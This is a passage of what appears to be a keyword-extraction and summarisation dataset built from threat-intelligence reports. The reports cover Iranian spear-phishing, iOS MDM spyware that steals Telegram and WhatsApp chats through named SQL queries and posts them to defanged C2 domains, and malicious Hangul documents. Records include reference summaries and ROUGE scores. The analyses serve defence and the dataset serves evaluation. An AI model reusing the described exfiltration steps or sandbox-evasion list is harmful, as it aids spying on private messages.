Machinewin32_remotewin64_remote64ollydbgProcessHackertcpviewautorunsautorunscfilemonprocmonPDFmyURL converts any url to pdf!regmonregmonprocexpidaqidaq64ImmunityDebuggerWiresharkdumpcapHookExplorerImportRECPEToolsLordPEdumpcapSysInspectorproc_analyzersysAnalyzersniff_hitwindbgjoeboxcontroljoeboxserverThis entry was posted on Tue Mar 13 12:15 EDT 2018 and filed under Yogesh Londhe, Dileep Kumar Jallepalli, Ben Read, Iran, Spear Phishing, and Sudeep Singh.PDFmyURL converts any url to pdf!Sign up for email updates Get information and insight on today's advanced threats from the leader in advanced threat prevention.First NameLast NameEmail AddressCompany NameThreat Research BlogProducts and Services BlogSUBSCRIBEPDFmyURL converts any url to pdf!Company Supplier DocumentsNew s and Events New s and Events Awards and Honors Email PreferencesTechnical Support Report Security Issue Documentation PortalFireEye Blogs Products and Services Executive PerspectivesThreat Map Threat Map View the Latest ThreatsContact Us Contact Us +1 877-347-3393 \ue905Copyright \u00a9 2018 FireEye, Inc. All rights reserved. Privacy & Cookies Policy | Privacy Shield | Legal DocumentationSite Language English \ue886PDFmyURL converts any url to pdf! ", "generated_text": "Iran; TEMP.Zagros; the campaign; spear; phishing emails; macro documents; government; defense entities; Central and Southwest Asia; the attackers; The macro; PowerShell; the INI file; VBS; process chain; the INF; SCT files; Infection Vector; the malware; the emails; C2; the macro; an email attachment; the malware; Victims; the campaign; a month; the targets; the campaign; the threat actor.", "ref_text": "<START-1>The PDF describes cyberattacks by an Iranian threat group called TEMP.Zagros or MuddyWater that targeted organizations in Asia and the Middle East from January to March 2018. The attacks distributed macro-enabled documents purporting to be from Pakistani, Turkish, Indian, and Tajikistani agencies. If the macro is enabled, it drops and executes scripts that install the POWERSTATS backdoor. The macros utilize recent techniques like INF/SCT file abuse and AppLocker bypass for indirect code execution to avoid detection. The backdoor uses RSA encryption for C2 communications and can gather system info, take screenshots, run commands, and more. The macros also achieve persistence by imitating legitimate scheduled tasks. The backdoor code shows anti-analysis measures like sandbox detection and shutdown. It uses a large proxy network for command and control. While the technical sophistication is medium, the continual evolution in tactics, techniques, and procedures shows TEMP.Zagros rapidly incorporates new methods into campaigns. Organizations should block macros, patch exploitation vectors, and use threat intelligence to detect the indicators and infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.13333333333333333, "t5/word/hint_hit_recall": 0.030303030303030304, "gpt3/lexical/rouge_rouge1": 0.37414965986394555, "gpt3/lexical/rouge_rouge2": 0.0684931506849315, "gpt3/lexical/rouge_rougeL": 0.23129251700680273, "gpt3/lexical/rouge_rougeLsum": 0.23129251700680273, "gpt3_generated_text": ["The article discusses a recent spear phishing campaign conducted by the Iranian threat group TEMP.Zagros targeting government and defense entities in Central and Southwest Asia. The attackers used malicious macro-based documents in emails to distribute malware, specifically a backdoor called POWERSTATS. The campaign involved two parts with a shift in tactics, techniques, and procedures after about a month. The infection vector was macro-based documents sent as email attachments with geopolitical themes tailored for victims in countries such as Turkey, Pakistan, Tajikistan, and India. The attackers used various techniques such as VBS scripts, PowerShell, INF, and SCT files for code execution and persistence. The campaign timeline, process chains, and examples of phishing emails were provided to illustrate the threat actor's activities."]}, {"split_name": "val", "sample_id": "val_5", "prompt_text": "Extract the keywords: SoftwareVulnerability InformationReputationCenterLibrarySupportCommunitiesAboutCareersBlogT H U R S D AY, J U LY 1 2 , 2 0 1 8Advanced Mobile Malware Campaign in India uses Malicious MDMThis blog post is authored by Warren Mercer and Paul Rascagneres and Andrew Williams.S U M M AR YCisco Talos has identified a highly targeted campaign against 13 iPhones which appears to be focused on India. The attacker deployed an open-source mobile device management (MDM) system to control enrolled devices. At this time, we don't know how the attacker managed to enroll the targeted devices. Enrollment could be done through physical access to the devices, or most likely by using social engineering to entice a user to register. In social engineering attacks the victim is tricked into clicking accept or giving the attacker physical access to a device. This campaign is of note since the malware goes to great lengths to replace specific mobile apps for data interception. Talos has worked closely with Apple on countering this threat. Apple had already actioned 3 certificates associated with this actor when Talos reached out, and quickly moved to action the two others once Talos tied them to the threat.An MDM is designed to deploy applications on enrolled devices. In this campaign we identified five applications that have been distributed by this system to the 13 targeted devices in India. Two of them appear to test the functionality of the device, one steals SMS message contents, and the remaining two report the location of the device and can exfiltrate various data.Convert webpages to pdf online with PDFmyURLSearch BlogS UB S C R IB E T O OUR FE E DPostsCommentsSubscribe via EmailB L OG A R C HIV E \u25bc 2 0 1 8 (102) \u25bc J U LY (9)Beers with Talos EP33 - Change theConversation or Threat Roundup for July 6-13 Advanced Mobile MalwareCampaign in India uses Mal Vulnerability Spotlight:Computerinsel Photoline M Vulnerability Spotlight: MultipleAntenna House Vu Microsoft Patch Tuesday - July 2018 Vulnerability Spotlight: MultipleThe attacker used the BOptions sideloading technique to add features to legitimate apps, including the messaging apps WhatsApp and Telegram, that were then deployed by the MDM onto the 13 targeted devices in India. The purpose of the BOptions sideloading technique is to inject a dynamic library in the application. The malicious code inserted into these apps is capable of collecting and exfiltrating information from the device, such as the phone number, serial number, location, contacts, user's photos, SMS and Telegram and WhatsApp chat messages. Such information can be used to manipulate a victim or even use it for blackmail or bribery.Thanks to the logs located on the MDM servers and the malware's command and control (C2) server, we were able to determine that the malware has been in use since August 2015. The campaign targeted only a few select devices (13) that are all located in India. The attacker left essential data on the servers, such as emails and usernames. As part of the attacker's development and testing it appears that they compromised their device \u2014 we observed a device named \"test\" or \"mdmdev.\" The log files we identified contain the phone number of the device. The number originates from India and uses the \"Vodafone India\" network with roaming capability disabled. With all of this information in mind, we assume with high confidence that the malware author works out of India.MDM is becoming more popular throughout large enterprises, and users should be aware that installing additional certificates on their device to allow remote management can result in potential malicious activity. By installing a certificate outside of the Apple iOS trusted certificate chain, you may open up to possible third-party attacks like this. Users must be aware that accepting an MDM certificate is equivalent to allowing someone administrator access to their device, passwords, etc. This must be done with great care in order to avoid security issues and should not be something the average home user does.The following information warns the security community and users of how this attack works. The likely use of social engineering to recruit devices serves as a reminder that users need to be wary of clicking on unsolicited links and verify identities and legitimacy of requests to access devices.The overall workflow of the deployment method and capabilities is pictured below.Convert webpages to pdf online with PDFmyURLVulnerability Spotlight: MultipleAdobe Acrobat DC Threat Roundup for June 29 to July6thSmoking Guns - Smoke Loaderlearned new tricks\u25ba J U N E (15) \u25ba M A Y (15) \u25ba A P R I L (21) \u25ba M A R C H (10) \u25ba F E B R U A R Y (14) \u25ba J A N U A R Y (18)\u25ba 2 0 1 7 (172) \u25ba 2 0 1 6 (98) \u25ba 2 0 1 5 (62) \u25ba 2 0 1 4 (67) \u25ba 2 0 1 3 (30) \u25ba 2 0 1 2 (53) \u25ba 2 0 1 1 (23) \u25ba 2 0 1 0 (93) \u25ba 2 0 0 9 (146) \u25ba 2 0 0 8 (37)R E C OM M E N D E D B L OG S C I S C O B L O G Field Area Network Security Webinar \u2013 Bringing OT and IT TogetherS N O R T B L O G Snort Subscriber Rule Set Update for 07/17/2018C L A M A V \u00ae B L O G ClamAV 0.100.1 has been released!The overall workflow of the deployment method and capabilities is pictured below.IO S M D M INFR AS TR U CTU R EMy tiny MDMTalos identified two different MDM servers:Convert webpages to pdf online with PDFmyURLhxxp://ios-certificate-update[.]com hxxp://www[.]wpitcher[.]comBoth servers above are based on the open-source project mdm-server \u2014 a small iOS MDM server. MDM allows for operating system-level control of multiple devices from a centralized location. A remote administrator can install or remove apps, install or revoke certificates, lock the device, or change password requirements, among other things. The operator is able to uninstall legitimate applications such as Telegram and WhatsApp to install the malicious versions described in the next section.Device enrollmentEach step of the enrollment process needs some type of user interaction. That's why Talos assumes the attackers use social engineering to get victims on the MDM. The first step for enrolling a device is to install the certificate authority:Convert webpages to pdf online with PDFmyURLIf the user clicks on \"Allow,\" the following message is displayed:Convert webpages to pdf online with PDFmyURLBy clicking on \"Install,\" the signature will switch to \"Verified:\"Convert webpages to pdf online with PDFmyURLThe device is ready to be enrolled:Convert webpages to pdf online with PDFmyURLWe can control the installed profile:Convert webpages to pdf online with PDFmyURLThe attacker is now able to control the device. A pop-up appears when the attacker pushes a new app to the user device. Here is an example with the compromised Telegram app mentioned later in the article:Convert webpages to pdf online with PDFmyURLThis gives the attacker a significant level of control over the victim device(s). This process is used similarly to a large-scale enterprise using MDM solutions. It is likely that the user is advised that the certificate must be installed to allow enrollment. This is most likely performed via a social engineering mechanism, i.e. a fake tech support-style call.The attacker used a domain which allowed them to try and fool the user. The use of \"ios-certificate- update[.]com\" may make it easier to reassure the user that this is normal. Since we believe this attack is targeting devices in India this is also something which a non-native English speaker may see as \"normal.\" The certificate and update naming convention is also designed to trick the user.Technical information about the MDMThe attacker left a lot of information behind, which allowed us to analyse files used by this MDM. First, the certificate used by the MDM:CA.crt:Serial Number: 13905745817900070731 (0xc0fb222544ceb74b) Issuer: C=CR, ST=Split, L=Split, O=NA, OU=IT, CN=ios-certificate- update.com/emailAddress=nicholas.vukoja@mail.ru Validity Not Before: Sep 6 11:33:09 2017 GMT Not After : Sep 6 11:33:09 2018 GMT Subject: C=CR, ST=Split, L=Split, O=NA, OU=IT, CN=ios-certificate- update.com/emailAddress=nicholas.vukoja@mail.ruConvert webpages to pdf online with PDFmyURLThe certificate was issued in September 2017 and contains an email address located in Russia. Our investigation suggests that the attacker is not based out of Russia. We assume this is a false flag to point researchers toward the idea of a \"classical Russian hacker.\" False flags are becoming more common in malware, both sophisticated and simple. It's an attempt to muddy the waters for the analysts/researchers to direct blame elsewhere.Identity.p12:Serial Number: 14177612590375883362 (0xc4c0ff88e475d262) Issuer: C=CR, ST=Split, L=Split, O=NA, OU=IT, CN=ios-certificate- update.com/emailAddress=Aleksi.Dushku@mail.ru Validity Not Before: Jan 6 04:59:56 2018 GMT Not After : Jan 6 04:59:56 2019 GMT Subject: C=CR, ST=Split, L=Split, O=NA, OU=IT, CN=ios-certificate- update.com/emailAddress=Aleksi.Dushku@mail.ruThis is another certificate, which points to an apparent reference to Russia by using another mail.ru address.Server.csr:Subject: C=HR, ST=Hrvatska, L=Split, O=NA, OU=IT, CN=ios-certificate- update.com/emailAddress=nicholas.vukoja@mail.ruIn this certificate, the attacker mentioned Hrvatska (\"Croatia\" in the Croatian language) with the same Russian email.Convert webpages to pdf online with PDFmyURLThe certificates are self-signed, or signed by the Comodo certificate authority.Log analysisOne of the most interesting pieces of information about the MDM is found in the log file. Because of this, we can confirm the following points:There are 13 compromised devices based off serial number All the devices are located in India (based on the phone numbers and phone providers) Phone models: iPhone 5.4, iPhone 7.2, iPhone 8.1, iPhone 8.2, iPhone 9.3, iPhone 9.4 iOS versions: 10.2.1, 10.3.1, 10.3.2, 10.3.3, 11.0, 11.0.3, 11.2.1, 11.2.5, 11.2.6At this time, we don't know how the attacker enrolled the 13 targeted devices into the MDM. It could be through physical access to the phones, or by using social engineering, motivating the user to enroll their device.We believe the attackers used their personal phone to test the MDM because they included devices named \"Test\" and \"mdmdev.\" These two devices share the same phone number and a name that is uncommon for a personal phone.The phone number originates from India and is registered on the \"Vodafone India\" network provider. When the device was registered on the MDM server, roaming was disabled. We assess with high confidence that the author is based out of in India.IO S APPL ICATIO NSMalicious applications using BOptions sideloadingEXPLANATIONConvert webpages to pdf online with PDFmyURLThe attacker's purpose appears to deploy malicious apps onto the 13 compromised devices. To doThe attacker's purpose appears to deploy malicious apps onto the 13 compromised devices. To do so, they decided to use the BOptions sideloading technique. The technique is described here. The purpose is to inject a dynamic library into the legitimate app. The GitHub project was used by the attacker to create the malicious BOptionspro.dylib library held in the iOS package (.ipa file). The injection library can ask for additional permissions, execute code and steal information from the original application, among other things. Milan-based technology company HackingTeam has previously used this technique.TELEGRAM, WHATSAPP & APPSSLOADERIn this campaign we identified three compromised versions of apps using this trick hosted on the MDM server. AppsSLoader is seemingly harmless. The app was created to test the library injection. It simply opens a pop-up to the user confirming the execution of the dynamic library. This was most likely created to test the effectiveness of the library prior to malicious deployment.The compromised versions of the Telegram and WhatsApp applications used in this campaign are more interesting and relevant. They first contain the same malicious code. The purpose is to send collected data to a C2 server located at hxxp[:]//techwach[.]com.The malicious code checks permissions and asks for additional permissions if it does not already have them:Permission to access the user's contact list (PhnNumber::getContAccess) Permission to access the user's photos (PhnNumber::getPAccess)Convert webpages to pdf online with PDFmyURLPermission to access the user's photos (PhnNumber::getPAccess)One of the most relevant features of these compromised versions of the applications is the Telegram and WhatsApp message stealing feature. Here is the global workflow of it:For Telegram:Opens 'tgdata.db', an SQLite3 database used by Telegram Checks for the key 'UPLOADED_CHAT' in the key store Queries \"select users_v29.phone_number, users_v29.uid from users_v29;\" Queries for \"select messages_v29.from_id AS oid,users_v29.first_name, users_v29.last_name,users_v29.phone_number,messages_v29.message,messages_v29 .mid,messages_v29.to_id from messages_v29 join users_v29 ON (messages_v29.from_id = users_v29.uid);\" Parses results, storing off counts, timestamps, and other metadata. Sends by posting to hxxp[:]//techwach[.]comQuery screenshot:For WhatsApp:Convert webpages to pdf online with PDFmyURLOpens 'ChatStorage.sqlite', the database used for WhatsApp messages Queries 'SELECT Z_PK,ZFROMJID,ZTOJID,ZPUSHNAME,ZTEXT,ZMESSAGEDATEQueries 'SELECT Z_PK,ZFROMJID,ZTOJID,ZPUSHNAME,ZTEXT,ZMESSAGEDATE FROM ZWAMESSAGE WHERE Z_PK > '%d'' Parses results, storing off counts, timestamps, and other metadata. Sends by posting to hxxp[:]//techwach[.]comAdditionally, the malware is designed to be able to send the contacts, location, and images from the compromised device.Here is the list of the PHP pages available on the techwach C2 server:all.php UfmcRxYDaVVbrBl.phpAnother intriguing aspect of this malware is the way in which the malicious code achieves periodic code execution when the legitimate app bundled with it is running. One technique is to modify the app's code at runtime to execute the malicious code \u2014 this has been observed in previously analyzed iOS malware. Instead, this malware remains almost entirely independent of the app and gains execution by creating a timer that eventually executes the malicious code in a background thread. From there, it schedules tasks to be executed asynchronously in the background by leveraging the apps' background task queue. Ultimately, this means that the malicious code is invisible to the user of the app, and can be easily reused alongside any real application.PRAYTIMETalos identified another legitimate app executing malicious code during this campaign in India. PrayTime is used to give the user a notification when it's time to pray. The malicious code connects to the domain voguextra[.]com. The purpose is to download and display specific ads to the user.Convert webpages to pdf online with PDFmyURLThis app also leverages private frameworks to read the SMS messages on the device it is installed on and uploads these to the C2 server.MYAPPMyApp is a regular iOS app. However, the application does not do anything. It has almost no code associated with it other than standard iOS app runtime code. This could potentially be another testing app, but we're unable to determine the exact use. This app is non-malicious.Techwach C2 serverThe malicious code within Telegram and WhatsApp sent collected data to the server techwach[.]com. The server has been active since August 2015. Initially, the username used on the server was arnoldrex. Subsequently, this was changed to chernobog (referencing a Slavic deity).CO NCL U S IO NThis investigation shows us that this attack targeted a very limited number (13) of users using iPhone devices in India. At the time, it is unclear who the targets of the campaign were, who was the perpetrator, or what the exact purpose was. It's very likely the vector for this campaign was simply social engineering - in other words asking the user to click \"ok\". This type of vector is very difficult to defend against since users can often be tricked into acting against their best interests. This is another important reminder that users must think twice before clicking on unsolicited links or requests and also that users should verify credentials from any unsolicited calls requesting they take action on devices.Convert webpages to pdf online with PDFmyURLThe attackers installed an open-source MDM and used this to deploy malicious code into secureThe attackers installed an open-source MDM and used this to deploy malicious code into secure chat applications such as Telegram and WhatsApp to surreptitiously retrieve the messages/chats, photos and user's location from the victim's phone. Over a three-year period, the attackers remained under the radar \u2014 likely due to the low number of compromised devices. All the technical details point to an actor based in the same country as the victims: India. The attacker tried to mimic Russian hackers by using mail.ru email. However, we found testing devices enrolled on the MDM with an Indian phone number and registered on an Indian provider.Once a user has lost physical access to their phone, it's really a case of the attacker having a much easier playing field for malicious activity. The fact that the attacker was also able to get devices onto his own malicious MDM shows that the attacker was indeed motivated to obtain initial access but also to maintain persistence across the devices.CO V E R AGEAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next- Generation Firewall (NGFW), Next-GenerationIntrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.Convert webpages to pdf online with PDFmyURLAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IO CS www[.]wpitcher[.]comC2 Domains:Voguextra[.]com Techwach[.]comConvert webpages to pdf online with PDFmyURLAdvertising Domain:voguextra[.]comP O S T E D B Y P A U L R A S C A G N E R E S AT 3 : 0 0 P M L A B E L S : A P P L E , I N D I A , I O S , I P H O N E , M A LW A R E A N A LY S I S, M A LW A R E R E S E A R C H, M D MS H A R E T H I S P O S TNO COMMENTS:POST A COMMENTEnter your comment Comment as: Google AccountConvert webpages to pdf online with PDFmyURLPublish PublishPreview PreviewN E W E RP O S TH O M ES U B S C R I B E T O : P O S T C O M M E N T S ( AT O M )O L D E RP O S TSoftware Microsoft Advisory Snort RulesIP Blacklist Download BlogCONNECT WITH US\u00a9 2018 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy here.Convert webpages to pdf online with PDFmyURL ", "generated_text": "the report; the malware; use; iOS; devices; India; the attacker; mobile device management; MDM; apps; legitimate apps; WhatsApp; Telegram; the device; data; the user; part; the device; the attacker; the device; data; the MDM; social engineering; IOCs; the device; accuracy; S/M; the device; the security community; the campaign; a reminder; data; users; security awareness; IP addresses; Mobile Malware.", "ref_text": "<START-1>The PDF describes a highly targeted malware campaign against 13 iPhones in India that was discovered by Cisco Talos. The attacker used an open-source mobile device management (MDM) system to enroll the victim devices and maintain control over them. The enrollment was likely done through physical access or social engineering to trick the user into accepting the MDM. Once enrolled, the MDM allowed the attacker to install malicious apps, including compromised versions of Telegram and WhatsApp. These apps steal data like contacts, messages, location, and photos and exfiltrate it to a command and control server. The malware uses the BOptions technique to inject code into the apps to achieve this. Analysis of the infrastructure suggests the attacker is based in India, despite attempts to imply otherwise through false flags like Russian email addresses. The campaign has been ongoing since 2015 but has only targeted around 13 devices, likely specific individuals. While the exact purpose and targets are unknown, the report demonstrates the risks of allowing external management of mobile devices which provides deep access. It also highlights the need for social engineering awareness when users receive unsolicited requests on their devices. <END-1>", "t5/keyword/hint_hit_precision": 0.4166666666666667, "t5/word/hint_hit_recall": 0.1256544502617801, "gpt3/lexical/rouge_rouge1": 0.5417867435158501, "gpt3/lexical/rouge_rouge2": 0.15652173913043482, "gpt3/lexical/rouge_rougeL": 0.2420749279538905, "gpt3/lexical/rouge_rougeLsum": 0.2420749279538905, "gpt3_generated_text": ["This report discusses a highly targeted mobile malware campaign in India that utilizes malicious mobile device management (MDM) to control enrolled devices. The attacker deployed an open-source MDM system to replace specific mobile apps, such as WhatsApp and Telegram, on 13 iPhones in India for data interception. The malware injected into these apps can collect and exfiltrate various data from the devices. The attacker likely used social engineering to enroll the devices, highlighting the importance of security awareness and verifying requests for device access. The campaign targeted a small number of devices, all located in India, and the attacker's IP addresses suggest they operate from India. Users should be cautious when installing additional certificates for remote management, as it can open up to potential malicious activity. This information serves as a reminder for the security community and users to be vigilant against such attacks and verify the legitimacy of requests for device access."]}, {"split_name": "val", "sample_id": "val_6", "prompt_text": "Extract the keywords: Mar 23, 2018Targeted Attacks on South Korean OrganizationsAttacks Using Local Word ProcessorSep 2016 - Dec 2017Analysis Research Team, AhnLab Security Emergency Response Center (ASEC)220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, Republic of Korea, 13493 | Tel: +82 (0)31-722-8000 | Fax: +82 (0)31-722-8901 | url\u00a9 AhnLab, Inc. All rights reservedTargeted Attacks on South Korean OrganizationsContentsSummary 3Overview 4Attack Methods 4Types of Malicious Hangul Files 4Vulnerabilities 5JavaScript 5Encapsulated PostScript (EPS) 6Embedded Objects 6Status of malicious Hangul document files 7Change in Malware Source Codes Used in Hangul Document File Attacks 10Attack groups 10Group A - Red Eyes 10Group B 12Group C 13Other 15Response and Prevention 16Reference 16\u00a9 AhnLab, Inc. All rights reserved 2Targeted Attacks on South Korean OrganizationsSummaryHangul (also known as Hangul Word Processor or HWP) is a proprietary word processing application published by the South Korean company Hancom Inc Hangul's specialized support for the Korean written language has gained its widespread use in South Korea, especially by the government. Malicious attackers targeting Korea are now using Hangul files.This report is based on AhnLab\u2019s analysis malicious Hangul files found over 16 months, from September 2016 to December 2017, and found the target of attack to be mainly employees of North Korea related businesses and virtual currency related business.The attack methods using Hangul files came in many forms: exploiting different vulnerabilities, JavaScripts, Encapsulated PostScripts (EPS), and embedded objects. Current attacks mainly use the EPS method.AhnLab analyzed the problem classifying the attack groups by attack target, attack method, and malware. The attackers can be divided into three groups, and two of the three groups are actively using Hangul files as a delivery mechanism.In the past, the attacks using Hangul files created and executed a backdoor, which exploited a Hangul vulnerability on the user's computer. However, attacks found after September 2016 are mainly executed in the memory of a computer. This seems to be a technique to bypass behavior-based diagnostics of security solutions, which detect the creation of malware in document files.Fortunately, there is no new malware exploiting Hangul\u2019s vulnerabilities since the second half of 2016. This means that the attacker is exploiting a vulnerability that has already been patched so the users can prevent attacks by simply conducting the latest Hangul security update. This, however, does not apply to the embedded object type of malware found in Hangul files.\u00a9 AhnLab, Inc. All rights reserved 3Targeted Attacks on South Korean OrganizationsOverviewHangul (also known as Hangul Word Processor or HWP) is a proprietary word processing application published by the South Korean company Hancom Inc Hangul's specialized support for the Korean written language has gained its widespread use in South Korea, especially by the government and schools. Thus the attackers using Hangul as a method are those wishing to target Korean governmental institutions. AhnLab has analyzed the malicious Hangul files found from September 2016 to December 2017 and summarized the attack targets, attack method, and the attack groups.Attack MethodsThe most common attack method is via email. An attacker creates an email masquerading as content that would interest the chosen target and induces the target to open the Hangul files containing malware.Either an attacker can use the method of sending an email attachment or the attacker can alternately attempt to deliver the malware by adding a download URL in the email.[Figure 1] Hangul file link mailTypes of Malicious Hangul FilesHangul file attacks use methods such as vulnerability exploitation, scripts, Encapsulated PostScript (EPS), and embedded objects, which will be discussed in details below.\u00a9 AhnLab, Inc. All rights reserved 4Targeted Attacks on South Korean OrganizationsAn attacker may use other executable files, such as EXE and LNK files disguised as HWP files. However, though widely used, it is not considered an actual Hangul file attack.[Figure 2] LNK file disguised as a Hangul fileVulnerabilitiesAn attacker arbitrarily modifies the content of a document to execute malware via an abnormal behavior. Attack methods exploiting this vulnerability are not easy to detect. Moreover, the compatibility of the files are greatly affected by the Hangul software version so sometimes the document takes a while to open or the document may not even be able to be opened at all. Fortunately, no new vulnerabilities have been found in Hangul since the fall of 2016.JavaScriptHancom Office supports JavaScript and many malware are written in JavaScript. Normally, documents containing scripts ask for user confirmation before running the script. However, a vulnerability in which a script starts without user notification was found in a 2007 version of Hangul.[Figure 3] Malicious Hangul files containing JavaScriptThe file contains data corresponding to a Windows executable file in JavaScript and uses it to create Windows executable files.\u00a9 AhnLab, Inc. All rights reserved 5Targeted Attacks on South Korean Organizations[Figure 4] Malicious JavaScriptEncapsulated PostScript (EPS)Encapsulated PostScript (EPS) is a script that processes Adobe images. After the vulnerability exploiting EPS (CVE-2015-2545) was found in 2015, the first malicious Hangul files written in EPS appeared in September 2016 and were found continuously until January 2018.[Figure 5] Examples of attacks using EPS scriptsCurrently malicious scripts written in EPS cannot run in Hangul with the latest security update. However, attacks using this vulnerability will continue until a new vulnerability is found. Therefore, users must apply the latest security updates to avoid damage from EPS scripted attacks.Embedded ObjectsObject embedding itself is not a vulnerability but it is a way to attach executable codes in a document and then induce a user to click and execute it.It can be used by attackers to disguise malware in the form of an annex within the document.\u00a9 AhnLab, Inc. All rights reserved 6Targeted Attacks on South Korean OrganizationsThere is also a type of document that uses an image of a notification window as seem in Figure 6. When the user clicks the \"OK\" button to close the window, the inserted malware is executes.[Figure 6] Malicious Hangul document disguised as a notification windowAmong the embedded objects, the executable file asks the user whether to run it. You can see the path where the file is saved through the notification window as in Figure 7.[Figure 7] A pop-up when running an executable file with an inserted objectStatus of malicious Hangul document filesA total of 135 malicious Hangul document files were collected over 16 months from September 2016 to December 2017 by AhnLab. The monthly statistics for this data is as shown in [Table 1].\u00a9 AhnLab, Inc. All rights reserved 7Targeted Attacks on South Korean Organizations[Table 1] Number of malicious Hangul document files detected by monthThe percentages of attacks by their various types were 75% EPS, 14% vulnerability exploitation, 7% object embedding, and scripts came in at 4%. EPS was the most used method.[Figure 8] Ratio of attack methods using malicious Hangul filesAnd the collected information by category were 18% on general information (on products, security, announcements, and speech) ,17% on North Korea, 17% on virtual money, 14% on finance, and 8% on resumes.\u00a9 AhnLab, Inc. All rights reserved 8Targeted Attacks on South Korean Organizations[Figure 9] Ratio of content of malicious Hangul filesIt seems like the attacker is targeting individuals working on things related to North Korea (North Korean defectors, North Korean human rights activists, North Korean researchers, journalists, etc.).AhnLab analyzed the content of malicious Hangul document files, attack techniques, and malware source codes to find the following information. First, the attackers can be divided into three groups (A, B, and C) where Group A (26%) and Group B (48%) were responsible for 74% of the attacks, comprising most of the attacks. Other than the three groups, 25% of the attacks are unclassified, meaning that there could be more attack groups revealed upon later analysis.[Figure 13] Ratio to attack groups using malicious Hangul files\u00a9 AhnLab, Inc. All rights reserved 9Targeted Attacks on South Korean OrganizationsChange in Malware Source CodesThe malware that exploits Hangul document files are generally 'downloaders' that download other malware and 'backdoors' that allow remote control.The most common form is the downloader. The downloader downloads malware from a specific address. If files can be downloaded from a specific address, it is even possible to replace the old malware with new malware. It can also include a backdoor that can remotely manipulate the contents of an infected computer.In the past, it was common to create and run a backdoor on a user's computer using a vulnerability in Hangul. However, most malware found since September 2016 runs only in the computer\u2019s memory. This seems to be a technique to bypass behavior-based diagnostics of security solutions which detect the pattern of malware in document files.We have also found cases where files were created, but only executed when Hangul was running.Attack groupsIn 2017, there were at least three groups using Hangul files for attacks -note that classification of attack groups can be divided or merged depending on the development of any new leads. Among them, the attack targets of the two groups that actively used Hangul files for attack were clear.Group A - Red EyesGroup A is also known as Red Eyes, Group 123, ScarCurf, APT37, Reaper, and Ricochet Chollima. From the analysis results, it was deemed that the main target of this group are individuals working in the fields related to North Korea, such as North Korean defectors, North Korean human rights activists, North Korean researchers, and journalists. In addition, documents related to the military were included in attack cases.The names of the malicious Hangul file used in this attack group are as follows:\u00a9 AhnLab, Inc. All rights reserved 10Targeted Attacks on South Korean Organizations[Table 2] Malicious Hangul document file names used in attacks by Group AThis group created malware using the first EPS in September 2016.The Hangul document, disguised as a North Korean New Year Address for January 2017, is in the form of an embedded object. Information about malware creators can be gained using the document. For example, looking at the file path \u2018C:\\Users\\pad-2\\AppData\\Local\\Temp\\Hwp (3).exe\u2019 for object insertion, we can find that the name of the the creator may be Korean or someone familiar with Korean. We are tracking malware produced by the same group through related strings.particular,lookingcreatorpad-2.atthestringssuchisIn[Figure 14] Malware maker information contained in a malicious Hangul document fileIn late October 2017, the same group used Microsoft Word's Dynamic Data Exchange (DDE) document file for an attack.In April 2017, this attack group released a Hangul file with a malware to destroy hard disks. When the malware is executed, it destroys the content of the hard disk, reboots, and displays only a message that reads 'Are you Happy?'.\u00a9 AhnLab, Inc. All rights reserved 11Targeted Attacks on South Korean Organizations[Figure 15] Booting screen after hard disk destructionMalware of this attack group contains a character string that is a typical program database (PDB) file format. Through this PDB- related string, we can guess the attacker's malware version and malware type.[Figure 16] PDB contents by versionThis attack group was known for an attack using a zero-day flash file at the end of January 2018. They are a new group in the center of attention since a report was published on the group in February 2018.Group BGroup B is believed to be the group associated with the 2014 Sony Pictures hacking. Since 2014, this group has attacked defense industries and large corporations in Korea, and is focused on attacking virtual money exchanges and virtual currency-related laboratories in 2017. It impersonated a financial committee as well as an attorney general, etc., and disguised important files as the preparatory documents of a tax investigation, transactions of suspected corporate body, and other content relevant to an investigation.\u00a9 AhnLab, Inc. All rights reserved 12Targeted Attacks on South Korean Organizations[Table 3] Malicious document file names used in the attacks of Group BThis group mainly used EPS, but the scripting method is quite different compared to Group A.Group C[Figure 17] Malicious EPS used by Group BIn Group C, only the Hangul file in an object embedded type was found in June of 2017. However, analysis of the embedded executable file shows that there are more than 40 variants and that they have been active since July 2015.Malware is embedded as an object in the Hangul document file, and when the user clicks it, the downloader runs and downloads additional malware from url At the same time, it downloads the\u00a9 AhnLab, Inc. All rights reserved 13Targeted Attacks on South Korean Organizationsnormal Hangul file from url and displays the contents of the \"annex.hwp\" file so that the user does not know about the malware infection.[Figure 17] is the downloaded 'annex.hwp', which contains the content from a North Korean human rights civilian organization activity support project.Also, the object embedded Hangul file shows that the user name of the malware maker is 'easy.\u2019[Figure 18] Information of the maker in a malicious Hangul document fileAfter the analysis of the downloader variants, the name of the Hangul file to download is shown in [Table 4].[Table 4] Names of download files used for attack by Group CApproximately 25 backdoor variants downloaded by the downloader have been identified and were first found in July 2015. The file names of the backdoors are shown in [Table 5].[Table 5] Names of backdoor file used for attack by Group CGroup C uses Mutex as a downloader and a backdoor as shown in [Table 6].\u00a9 AhnLab, Inc. All rights reserved 14Targeted Attacks on South Korean Organizations[Table 6] Mutex used in malware in Group C attacksThe target of the attack is identified as a North Korean human rights group for now. However, we cannot identify specific attack targets as we could not check other Hangul files. Group C seems to be different from Group A so far, but if the main target of this group is North Korea related workers, association with Group A cannot be excluded.OtherIn November 2017, a Hangul file contained Ursnif, a financial information hijacking malware, was also found.For documents containing Ursnif variants, the username was the name of a famous Korean company, and the path to the object was C:\\Users\\User Name\\Desktop\\DuranDuran\\Sample\\patch39.exe.[Figure 19] File path\u00a9 AhnLab, Inc. All rights reserved 15Targeted Attacks on South Korean OrganizationsResponse and PreventionAhnLab\u2019s world recognized anti-malware solution V3 diagnoses Hangul malware. The aliases identified by the latest update in order to avoid 